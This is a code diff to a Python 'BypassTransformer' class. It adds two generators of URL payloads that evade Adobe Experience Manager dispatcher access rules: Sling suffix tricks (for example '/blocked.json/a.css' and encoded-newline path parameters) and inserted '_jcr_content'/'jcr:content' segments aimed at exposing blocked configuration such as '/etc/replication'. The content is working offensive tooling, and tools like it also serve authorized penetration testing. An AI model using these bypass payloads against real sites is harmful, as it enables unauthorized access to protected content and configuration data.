@@ -57,6 +57,8 @@ class BypassTransformer:
             BypassTechnique.CASE_SENSITIVITY: self.case_sensitivity,
             BypassTechnique.SEMICOLON_GAP: self.semicolon_gap,
             BypassTechnique.PATH_OVERLAP: self.path_overlap,
+            BypassTechnique.SLING_SUFFIX: self.sling_suffix,
+            BypassTechnique.JCR_CONTENT: self.jcr_content_bypass,
         }
     
     def transform(self, base_path: str, technique: Optional[BypassTechnique] = None) -> List[BypassResult]:
@@ -490,6 +492,100 @@ class BypassTransformer:
                     url=f"{overlap_url}.json",
                     technique=BypassTechnique.PATH_OVERLAP,
                     description=f"Path overlap + .json: {prefix} -> {base}",
+                    priority=11
+                ))
+        
+        return results
+    
+    def sling_suffix(self, path: str) -> List[BypassResult]:
+        """Sling suffix bypass.
+        
+        Sling resolves the resource from the first extension; everything after
+        is treated as suffix.  Dispatchers often match the *last* extension,
+        so /blocked.json/a.css looks like a CSS file to the dispatcher but
+        returns JSON from Sling.
+        
+        Reference: 0ang3el / aem-hacker
+        """
+        results = []
+        base = path.rstrip("/")
+        
+        # Static-resource suffixes that dispatchers typically allow
+        safe_suffixes = [
+            "/a.css", "/a.js", "/a.gif", "/a.png", "/a.ico", "/a.html",
+            "/a.1.json", "/b.infinity.json",
+        ]
+        
+        # Apply to common JSON/XML extensions
+        extensions = [".json", ".xml", ".1.json", ".tidy.json", ".infinity.json"]
+        
+        for ext in extensions:
+            for suffix in safe_suffixes:
+                results.append(BypassResult(
+                    url=f"{base}{ext}{suffix}",
+                    technique=BypassTechnique.SLING_SUFFIX,
+                    description=f"Sling suffix: {ext}{suffix}",
+                    priority=11
+                ))
+        
+        # Suffix with path parameters
+        results.append(BypassResult(
+            url=f"{base}.json;%0aa.css",
+            technique=BypassTechnique.SLING_SUFFIX,
+            description="Sling suffix with encoded newline",
+            priority=9
+        ))
+        results.append(BypassResult(
+            url=f"{base}.json/a.css;a=b",
+            technique=BypassTechnique.SLING_SUFFIX,
+            description="Sling suffix + path param",
+            priority=9
+        ))
+        
+        return results
+    
+    def jcr_content_bypass(self, path: str) -> List[BypassResult]:
+        """_jcr_content / jcr:content bypass.
+        
+        Accessing the jcr:content child node can bypass dispatcher rules
+        that only match the parent path.  The underscore form (_jcr_content)
+        is the URL-safe alias for jcr:content.
+        
+        E.g. /etc/replication is blocked → /etc/replication/_jcr_content.json
+        may still return configuration data.
+        """
+        results = []
+        base = path.rstrip("/")
+        
+        jcr_variants = [
+            "/_jcr_content",
+            "/jcr:content",
+            "/jcr%3acontent",
+            "/jcr%3Acontent",
+        ]
+        
+        extensions = [".json", ".1.json", ".infinity.json", ".xml"]
+        
+        for variant in jcr_variants:
+            for ext in extensions:
+                results.append(BypassResult(
+                    url=f"{base}{variant}{ext}",
+                    technique=BypassTechnique.JCR_CONTENT,
+                    description=f"jcr:content bypass: {variant}{ext}",
+                    priority=12
+                ))
+        
+        # Also try _jcr_content on path segments
+        if "/" in base:
+            parts = base.strip("/").split("/")
+            for i in range(len(parts)):
+                prefix = "/" + "/".join(parts[:i+1])
+                suffix = "/".join(parts[i+1:]) if i+1 < len(parts) else ""
+                jcr_path = f"{prefix}/_jcr_content/{suffix}" if suffix else f"{prefix}/_jcr_content"
+                results.append(BypassResult(
+                    url=f"{jcr_path}.json",
+                    technique=BypassTechnique.JCR_CONTENT,
+                    description=f"jcr:content inserted after segment {i}",
                     priority=11
                 ))
         
